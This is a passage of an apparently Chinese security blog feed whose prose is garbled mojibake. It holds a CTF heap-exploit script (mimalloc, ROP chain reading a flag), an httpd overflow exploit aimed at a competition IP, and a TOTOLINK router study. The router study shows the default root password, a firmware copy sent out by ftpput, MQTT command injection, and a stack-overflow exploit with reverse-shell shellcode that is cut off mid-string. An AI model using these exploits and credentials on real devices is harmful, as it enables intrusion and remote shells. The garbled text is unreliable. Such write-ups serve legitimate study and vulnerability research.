class="hljs-keyword">sla</span>(<span class="hljs-keyword">menu</span>,str(size).encode())<br>    <span class="hljs-keyword">sa</span>(<span class="hljs-keyword">menu</span>,content)<br><br>def <span class="hljs-keyword">delete</span>(idx):<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;2&#x27;</span>)<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">menu</span>,str(idx).encode())<br><br>def <span class="hljs-keyword">edit</span>(idx,content):<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;3&#x27;</span>)<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">menu</span>,str(idx).encode())<br>    <span class="hljs-keyword">sa</span>(<span class="hljs-keyword">menu</span>,content)<br><br>def show(idx):<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;4&#x27;</span>)<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">menu</span>,str(idx).encode())<br><br>def pwn():<br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x40, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span>x40)  # <span class="hljs-number">0</span><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x40, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span>x40)  # <span class="hljs-number">1</span><br><br>    show(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span>x40)<br>    heap_base = u64(<span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-keyword">b</span><span class="hljs-string">&quot;\x00&quot;</span>)) - <span class="hljs-number">0</span>x20140<br><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;aa&#x27;</span>)  # <span class="hljs-number">2</span><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;aa&#x27;</span>)  # <span class="hljs-number">3</span><br>    <span class="hljs-keyword">delete</span>(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">delete</span>(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">edit</span>(<span class="hljs-number">2</span>, p64(heap_base + <span class="hljs-number">0</span>x158))<br><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>x3):<br>        <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">0</span>x8)<br>    show(<span class="hljs-number">6</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">8</span>)<br>    libmimalloc.address = u64(<span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>)) + <span class="hljs-number">0</span>x1f48c0<br>    libc.address = libmimalloc.address - <span class="hljs-number">0</span>x1f2000<br><br>    leak(<span class="hljs-string">&quot;heap_base&quot;</span>, heap_base)<br>    leak(<span class="hljs-string">&quot;libcmimalloc&quot;</span>, libmimalloc.address)<br>    leak(<span class="hljs-string">&quot;libc.address&quot;</span>, libc.address)<br><br>    deferred_free = libmimalloc.address + <span class="hljs-number">0</span>x75f50<br>    setcontext = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br>    fake_rdx = heap_base + <span class="hljs-number">0</span>x30000<br>    pop_rdi = <span class="hljs-number">0</span>x0000000000023b6a + libc.address<br>    pop_rsi = <span class="hljs-number">0</span>x000000000002601f + libc.address<br>    pop_rdx = <span class="hljs-number">0</span>x0000000000142c92 + libc.address<br>    pop_rax = <span class="hljs-number">0</span>x0000000000036174 + libc.address<br>    syscall = <span class="hljs-number">0</span>x00000000000630a9 + libc.address<br>    <span class="hljs-keyword">ret</span> = <span class="hljs-number">0</span>x0000000000022679 + libc.address<br><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;c&#x27;</span> * <span class="hljs-number">8</span>)  # <span class="hljs-number">7</span><br>    <span class="hljs-keyword">delete</span>(<span class="hljs-number">7</span>)<br>    <span class="hljs-keyword">delete</span>(<span class="hljs-number">7</span>)<br>    <span class="hljs-keyword">edit</span>(<span class="hljs-number">7</span>, p64(deferred_free - <span class="hljs-number">0</span>x10))<br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;c&#x27;</span> * <span class="hljs-number">8</span>)<br><br><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, p64(<span class="hljs-number">0</span>) + p64(fake_rdx) + p64(setcontext))<br><br>    payload = <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;./flag\x00\x00&#x27;</span><br>    payload = payload.ljust(<span class="hljs-number">0</span>xa0, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(fake_rdx + <span class="hljs-number">0</span>xb0) + p64(<span class="hljs-keyword">ret</span>)<br><br>    orw = flat([<br>        pop_rdi, fake_rdx,<br>        pop_rsi, <span class="hljs-number">0</span>,<br>        pop_rdx, <span class="hljs-number">0</span>,<br>        pop_rax, <span class="hljs-number">2</span>,<br>        syscall,<br>        pop_rdi, <span class="hljs-number">3</span>,<br>        pop_rsi, fake_rdx + <span class="hljs-number">0</span>x1200,<br>        pop_rdx, <span class="hljs-number">0</span>x50,<br>        pop_rax, <span class="hljs-number">0</span>,<br>        syscall,<br>        pop_rdi, <span class="hljs-number">1</span>,<br>        pop_rax, <span class="hljs-number">1</span>,<br>        syscall<br>    ])<br><br>    <span class="hljs-keyword">edit</span>(<span class="hljs-number">2</span>, payload + orw)<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;1&#x27;</span>)<br><br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">menu</span>, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;1&#x27;</span>)<br><br>    <span class="hljs-keyword">p</span>.interactive()<br><br>pwn()<br></code></pre></td></tr></table></figure><h2 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h2><p>èµ›åçœ‹äº†ä¸‹å¥½åƒå’Œvnctf2022çš„classic httpdæŒºåƒçš„</p><p>å°±æ˜¯Authorizationé‚£é‡Œçš„base64æœ‰ä¸ªæ ˆæº¢å‡º</p><p>å¯ä»¥æ„é€ htdocs&#x2F;..&#x2F;..&#x2F;..&#x2F;bin&#x2F;sh</p><p>ç„¶åå†ç»•ä¸€ä¸‹å°±èƒ½è¿›å…¥sub_0x2993æ‰§è¡Œexeclï¼ˆcmd,0ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>flag=<span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;60.204.140.184&#x27;</span>, <span class="hljs-number">30318</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;&#x27;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-comment"># url = &quot;http://127.0.0.1:4000/&quot;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># payload = &quot;a&quot;*0x3a + &quot;/../../../bin/sh?korey0sh1.html&quot;</span><br><span class="hljs-comment"># res = requests.get(url=url,auth=(&quot;Admin&quot;,payload))</span><br><span class="hljs-comment"># print(res.text)</span><br><br>payload = <span class="hljs-string">b&#x27;GET / HTTP/1.1\r\n&#x27;</span><br>payload += <span class="hljs-string">b&#x27;Authorization: Basic &#x27;</span> <br>payload += base64.b64encode(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;/../../../../../../bin/sh?korey0sh1.html&#x27;</span>)<br>payload += <span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span><br><br>sd(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆrequestå‘åŒ…ä¸è¡Œ</p><h1 id="0xff-å†™åœ¨æœ€åçš„æœ€å"><a href="#0xff-å†™åœ¨æœ€åçš„æœ€å" class="headerlink" title="0xff:å†™åœ¨æœ€åçš„æœ€å"></a>0xff:å†™åœ¨æœ€åçš„æœ€å</h1><p>é¢˜ç›®æ„Ÿè§‰éƒ½æŒºå¸¸è§„çš„ï¼ˆpwnè¢«å„ä½å¤§çˆ¹æ‰“çƒ‚äº†ï¼‰</p><p>mi_mallocç¬¬ä¸€æ¬¡åšï¼Œå­¦åˆ°æ–°ä¸œè¥¿ï¼Œå¾ˆæ„Ÿè°¢å‡ºé¢˜å¸ˆå‚…ã€‚</p><p>httpdè¿™ç§åè®®æ¨¡æ‹Ÿé¢˜å¥½åƒç¢°åˆ°çš„è¶Šæ¥è¶Šå¤šäº†ï¼Œæ„Ÿè§‰è¦æä¸ªä¸“é¢˜å¥½å¥½å¼ºåŒ–ä¸€ä¸‹ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFã€Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å€’éœ‰è›‹çš„totolinkå­¦ä¹ æ‰‹è®°</title>
    <link href="/2023/07/12/%E5%80%92%E9%9C%89%E8%9B%8B%E7%9A%84totolink%E5%AD%A6%E4%B9%A0%E6%89%8B%E8%AE%B0/"/>
    <url>/2023/07/12/%E5%80%92%E9%9C%89%E8%9B%8B%E7%9A%84totolink%E5%AD%A6%E4%B9%A0%E6%89%8B%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰"><a href="#0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰" class="headerlink" title="0x0:å†™åœ¨æ‰€æœ‰ä¹‹å‰"></a>0x0:å†™åœ¨æ‰€æœ‰ä¹‹å‰</h1><p>kernelã€v8ã€è™šæ‹ŸåŒ–ã€Iotï¼Œå› ä¸ºç¬”è€…å¹¶ä¸æƒ³åœ¨pwnçš„å­¦ä¹ ä¸Šæ­¢æ­¥äºCTFï¼Œä¸”å¯¹Iotä¹Ÿæœ‰ç‚¹å…´è¶£ï¼Œæ•…é€‰æ‹©äº†è¿™æ¡è·¯ï¼ˆä½ ä»¥ä¸ºæ˜¯æˆ‘ä¸æƒ³å½“ä¸ªå†…æ ¸å¸¦å¸ˆå—ï¼Œæ˜¯å®åœ¨æ˜¯å­¦ä¸ä¼šå•Šï¼‰</p><p>åœ¨namelessçˆ·çˆ·çš„æ¨èä¸‹ï¼Œç¬”è€…åœ¨å’¸é±¼ä¸Šä¹°äº†ä¸€ä¸ªtotolinkï¼Œä»¥æ­¤æ¥ä½œä¸ºç¬”è€…Iotæ¼æ´æŒ–æ˜çš„å…¥é—¨æ•™æã€‚</p><h1 id="0x1-æ‹¿ä¸åˆ°shellï¼Œå¦ˆå¦ˆç”Ÿçš„"><a href="#0x1-æ‹¿ä¸åˆ°shellï¼Œå¦ˆå¦ˆç”Ÿçš„" class="headerlink" title="0x1:æ‹¿ä¸åˆ°shellï¼Œå¦ˆå¦ˆç”Ÿçš„"></a>0x1:æ‹¿ä¸åˆ°shellï¼Œå¦ˆå¦ˆç”Ÿçš„</h1><p>ç°åœ¨å®˜ç½‘ä¸‹è½½å›ºä»¶<a href="https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/172/ids/36.html">@totolink</a></p><p>ç”¨binwalkè§£å‹ï¼Œæå–å‡ºæ–‡ä»¶ç³»ç»Ÿsquashfs-root</p><p>åœ¨é‡Œé¢éšä¾¿æ‰¾æ‰¾ï¼Œä¾¿çœ‹åˆ°äº†telnet.aspï¼Œé‚£ä¾¿å¯ä»¥é€šè¿‡telnetæœåŠ¡æ‹¿åˆ°è·¯ç”±å™¨çš„shell</p><p>å†æœç´¢ä¸€ä¸‹â€œshadowâ€è¿™ç§æ•æ„Ÿæ–‡ä»¶</p><p><img src="/img/T10/1.png" alt="img"></p><p>user:root</p><p>pwd:å…¶å®ç½‘ä¸Šä¸€æ‰¾å°±æ˜¯â€œcs2012â€ï¼Œmd5ä»˜è´¹è§£å¯†ä¹Ÿè¡Œ</p><p>OKç°åœ¨å°±å¯ä»¥æ‹¿ä¸€ä¸‹è·¯ç”±å™¨çš„shelläº†</p><p>æ‹¿åˆ°è®¾å¤‡å…ˆæš´æ‹†ï¼Œç„¶åæ’ä¸Šç½‘çº¿ï¼Œç¬”ç”µè¿ä¸Štotolinkçš„æ— çº¿</p><p><img src="/img/T10/0.jpg" alt="img"></p><p>ç™»å½•ç½‘å…³</p><p><img src="/img/T10/2.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°ç¬”è€…è¿™ä¸ªè®¾å¤‡çš„å›ºä»¶ç‰ˆæœ¬å·²ç»å¾ˆè€äº†</p><p>å…ˆæŠŠç½‘æ®µæ”¹åˆ°192.168.55.1ï¼Œé¿å…å’ŒåŸæœ¬çš„æ’ä¸Šï¼Œå†æŠŠé˜²ç«å¢™ä¸€å…³ï¼Œè¯•ç€è®¿é—®ã€IPã€‘&#x2F;telnet.asp</p><p>ç»“æœåŠå¤©åŠ è½½ä¸å‡ºæ¥</p><p>åæ¥æ— æ„çœ‹åˆ°totolinkè¿™ä¸ªç‰Œå­è¦ç”¨æä¸ºå…ˆè¿›çš„360æµè§ˆå™¨çš„å…¼å®¹æ¨¡å¼æ‰èƒ½è®¿é—®ï¼ˆçœŸçš„åè¡€ï¼‰</p><p>é€šè¿‡ç½‘é¡µæŠŠtelnetçš„æœåŠ¡æ‰“å¼€åï¼Œè¯•ç€ç”¨nmapæ‰«ä¸€ä¸‹</p><p><img src="/img/T10/3.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°telnetæœåŠ¡çš„é»˜è®¤ç«¯å£â€23â€œå·²ç»æ‰“å¼€ï¼Œéœ€è¦æ³¨æ„åˆ°çš„æ˜¯è¿™è¾¹è¿˜æœ‰ä¸ªmqttæœåŠ¡çš„é»˜è®¤ç«¯å£1883ä¹Ÿæ‰“å¼€äº†</p><p>ç”¨telnetç™»å½•ï¼Œuser:root password:cs2012</p><p><img src="/img/T10/4.png" alt="img"></p><p>ç™»é™†è¿›å»äº†ï¼Œå¥½è€¶ï¼ï¼</p><p>ç»“æœé»˜è®¤çš„busyboxç€å®æœ‰ç‚¹å¯’é…¸ï¼Œå¥½åœ¨æœ‰wgetï¼Œé‚£å°±èµ·ä¸ªhttpæœåŠ¡æ‹‰ä¸ªmipselæ¶æ„çš„busyboxè¿›å»å¥½äº†</p><p><img src="/img/T10/5.png" alt="img"></p><p>åŒæ—¶å› ä¸ºç¬”è€…çš„è·¯ç”±å™¨å›ºä»¶ç‰ˆæœ¬å®åœ¨æ˜¯å¤ªè€ï¼Œæ‰€ä»¥ç¬”è€…æŒ‰ç…§<a href="https://l0tus.vip/cn/totolink/">@I0tus</a>å¸ˆå‚…åšå®¢ä¸­çš„æ–¹æ³•ï¼ŒæŠŠçœŸæœºä¸­çš„å›ºä»¶æ‹‰äº†å‡ºæ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">./busybox-mipsel sh<br>./busybox-mipsel <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtdblock1 of=./mtdblock1<br><span class="hljs-comment">#å…ˆåœ¨å®¿ä¸»æœºèµ·ä¸ªftp</span><br>./busybox-mipsel ftpput -P 21 192.168.55.2 ./mtdblock1<br></code></pre></td></tr></table></figure><p>å› ä¸ºæƒ³è¯•ç€æ‰“æ‰“çœŸæœºï¼Œæ‰€ä»¥ç¬”è€…æ¥ä¸‹æ¥çš„åˆ†æéƒ½åŸºäºè¿™ä»½æå–å‡ºæ¥çš„å›ºä»¶</p><h1 id="0x2-ç”¨mqttç‹ ç‹ åœ°æ³¨å…¥"><a href="#0x2-ç”¨mqttç‹ ç‹ åœ°æ³¨å…¥" class="headerlink" title="0x2:ç”¨mqttç‹ ç‹ åœ°æ³¨å…¥"></a>0x2:ç”¨mqttç‹ ç‹ åœ°æ³¨å…¥</h1><p>ç”¨burpæŠ“ä¸ªåŒ…å…ˆ</p><p>è®¿é—®ç½‘å…³</p><p><img src="/img/T10/6.png" alt="img"></p><p>ç™»å½•</p><p><img src="/img/T10/7.png" alt="img"></p><p>å¼€å¯telnetæœåŠ¡</p><p><img src="/img/T10/9.png" alt="img"></p><p>çœ‹èµ·æ¥è´Ÿè´£ç½‘ç»œæœåŠ¡çš„æ˜¯è¿™ä¸ª&#x2F;cgi-bin&#x2F;cstecgi.cgi</p><p>ç™»å½•çš„æ—¶å€™å­˜åœ¨å¯†ç æ³„éœ²é—®é¢˜</p><p>åŒæ—¶ï¼Œåœ¨ä½¿ç”¨ç™»å½•æœåŠ¡å’ŒtelnetæœåŠ¡çš„æ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€äº›ç‰¹åˆ«çš„å­—ç¬¦ä¸²ã€‚</p><p>é‚£å°±æœä¸€ä¸‹</p><p>â€topicurlâ€å­˜åœ¨äºè¿™å‡ ä¸ªelfæ–‡ä»¶ä¸­ï¼Œç»“åˆæŠ“åŒ…ä¸­å‡ºç°çš„cstecgi.cgiï¼Œå°±æŠŠè¿™ä¸ªæ–‡ä»¶ç”¨idaæ‰“å¼€çœ‹çœ‹</p><p><img src="/img/T10/10.png" alt="img"></p><p>ç»“æœåˆšè¿›mainå‡½æ•°ä¸€çœ¼command injectionï¼Œå¤ªæŠ½è±¡äº†</p><p><img src="/img/T10/11.png" alt="img"></p><p>ä½†æ˜¯cstecgi.cgiä¸­å¹¶æ²¡æœ‰å’Œâ€œtopicurlâ€å®è´¨æœ‰å…³çš„ä¸œè¥¿ã€‚</p><p>é‚£å†æ‰¾ä¸€ä¸‹â€telnet_enabledâ€</p><p><img src="/img/T10/12.png" alt="img"></p><p>è¿›system.soåº·åº·</p><p>æ‰¾åˆ°äº†ä¸€ä¸ªsetTelnetCfgï¼Œå‘ç°å’Œå¼€å…³telnetæœåŠ¡çš„å‚æ•°å¾ˆåƒ</p><p><img src="/img/T10/13.png" alt="img"></p><p>å›æº¯è¿™ä¸ªå‡½æ•°ï¼Œ å‡ºç°module_init</p><p><img src="/img/T10/14.png" alt="img"></p><p>OKï¼Œcstecgi.cgiè´Ÿè´£çš„æ˜¯httpæœåŠ¡ï¼Œä½†æœ€åçš„setTelnetCfgå´æ˜¯åœ¨module_initä¸­æ‰§è¡Œã€‚cstecgi.cgiæ‰¾ä¸åˆ°åŠ è½½system.soçš„ç—•è¿¹ï¼Œä¸¤è€…å¹¶æ— ç“œè‘›ã€‚</p><p>ç¿»çœ‹<a href="https://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/#%E9%9A%90%E8%97%8F%E7%9A%84telnet%E5%8A%9F%E8%83%BD">@blingbling</a>å¸ˆå‚…çš„åšå®¢åï¼Œå‘ç°æ­¤å¤„ä½¿ç”¨çš„æ˜¯dlopençš„æ–¹æ³•ï¼ˆè·¯å¾„+.soæ–‡ä»¶åï¼‰ï¼Œäºæ˜¯æœç´¢è·¯å¾„â€&#x2F;lib&#x2F;cste_modulesâ€</p><p>å‡ºç°äº†å”¯ä¸€åŒ¹é…çš„ç»“æœ</p><p><img src="/img/T10/15.png" alt="img"></p><p>æ‰¾åˆ°dlopenå‡½æ•°ï¼Œè¿™æ ·æ€è·¯å°±ç†é€šäº†</p><p><img src="/img/T10/16.png" alt="img"></p><p>cstecgi.cgiæ¥å—åˆ°httpè¯·æ±‚åï¼Œé€šè¿‡cste_subåšä¸­è½¬ï¼Œç„¶ååˆ°system.soæ‰§è¡Œã€‚</p><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œcste_subæ˜¯å•¥å˜</p><p>åœ¨è·¯ç”±å™¨é‡Œç”¨netstat -pantuæŸ¥çœ‹ç«¯å£åå¾—çŸ¥ï¼Œcste_subæ˜¯1883ç«¯å£ï¼ˆcs_brokerï¼‰çš„å®¢æˆ·ç«¯ï¼Œè€Œ1883ç«¯å£æ˜¯mqttçš„é»˜è®¤ç«¯å£ã€‚</p><p><img src="/img/T10/17.png" alt="img"></p><p>æ‰€ä»¥åœ¨æ­¤è®¾å¤‡ä¸­ï¼Œhttpè¯·æ±‚ä¼šå…ˆè¢«è½¬åŒ–mqttï¼Œç„¶ååœ¨ä¸åŒçš„.soæ–‡ä»¶ä¸­å¾—åˆ°æ‰§è¡Œã€‚</p><p>é‚£å°±æ¥ç”¨mqttç‹ ç‹ æ³¨å…¥å§ï¼ï¼</p><p>å…ˆä¸‹è½½mqtt.fxï¼Œé…ç½®å¥½ipåè®¢é˜…å…¨éƒ¨ï¼Œä¸ºäº†æ•ˆæœæ˜¾è‘—ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾ä¸€ä¸ªcommand injectionæ¥è¯•è¯•</p><p>åœ¨&#x2F;lib&#x2F;cste_modules&#x2F;upgrade.soçš„functionâ€“setUpgradeFWä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªcommand injection</p><p><img src="/img/T10/18.png" alt="img"></p><p>æ„é€ æ•°æ®ï¼Œç›´æ¥ç”¨mqttå‘é€ï¼ˆ${IFS}æ˜¯ç”¨æ¥ç»•è¿‡ç©ºæ ¼çš„ï¼‰</p><p><img src="/img/T10/19.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°tmpæ–‡ä»¶å¤¹ä¸‹å·²ç»å‡ºç°ç›®æ ‡æ–‡ä»¶</p><p><img src="/img/T10/20.png" alt="img"></p><h1 id="0x3-æ¥è¯•è¯•æ ˆæº¢å‡ºå§"><a href="#0x3-æ¥è¯•è¯•æ ˆæº¢å‡ºå§" class="headerlink" title="0x3:æ¥è¯•è¯•æ ˆæº¢å‡ºå§"></a>0x3:æ¥è¯•è¯•æ ˆæº¢å‡ºå§</h1><p>&#x2F;lib&#x2F;cste_modules&#x2F;wps.so ä¸­çš„functionâ€“setWiFiWpsConfigå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´</p><p>å…ˆæ‹‰ä¸ªmipselæ¶æ„çš„gdbserverè¿›å»ï¼Œåœ¨è¿™è¾¹è°ƒè¯•çš„æ—¶å€™æ˜¯attach cste_subçš„pid</p><p><img src="/img/T10/22.png" alt="img"></p><p>ä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œè¿™æ¬¡ç”¨pythonå‘æ•°æ®åŒ…</p><p>ä½†æ˜¯ä¹Ÿå¯ä»¥å…ˆç”¨mqtt.fxå…ˆå‘ä¸ªcyclicç”Ÿæˆçš„å­—ç¬¦ä¸²ç¡®å®šä¸€ä¸‹offset</p><p><img src="/img/T10/23.jpg" alt="img"></p><p>ç„¶åç”¨msfåå¼¹shellä¸€æŠŠæ¢­</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-keyword">import</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">import</span> <span class="hljs-variable">paho</span>.<span class="hljs-property">mqtt</span>.<span class="hljs-property">client</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">mqtt</span><br><span class="hljs-keyword">import</span> <span class="hljs-variable">threading</span><br><br><span class="hljs-title function_">context</span>(<span class="hljs-variable">os</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-variable">linux</span>&#x27;, <span class="hljs-variable">arch</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-variable">mips</span>&#x27;, <span class="hljs-variable">log_level</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-variable">debug</span>&#x27;)<br><br><span class="hljs-variable">buf</span> <span class="hljs-operator">=</span>  <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xfa\xff\x0f<span class="hljs-char escape_">\x24</span><span class="hljs-char escape_">\x27</span><span class="hljs-char escape_">\x78</span>\xe0<span class="hljs-char escape_">\x01</span>\xfd\xff\xe4<span class="hljs-char escape_">\x21</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xfd\xff\xe5<span class="hljs-char escape_">\x21</span>\xff\xff<span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x28</span><span class="hljs-char escape_">\x57</span><span class="hljs-char escape_">\x10</span><span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x24</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\x0c<span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span>\xff\xff\xa2\xaf\xff\xff\xa4\x8f&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xfd\xff\x0f<span class="hljs-char escape_">\x34</span><span class="hljs-char escape_">\x27</span><span class="hljs-char escape_">\x78</span>\xe0<span class="hljs-char escape_">\x01</span>\xe2\xff\xaf\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x09</span>\x1d\x0e\x3c<span class="hljs-char escape_">\x09</span>\x1d\xce<span class="hljs-char escape_">\x35</span>\xe4\xff\xae\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x37</span><span class="hljs-char escape_">\x02</span>\x0e\x3c\xc0\xa8\xce<span class="hljs-char escape_">\x35</span>\xe6\xff\xae\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xe2\xff\xa5<span class="hljs-char escape_">\x27</span>\xef\xff\x0c<span class="hljs-char escape_">\x24</span><span 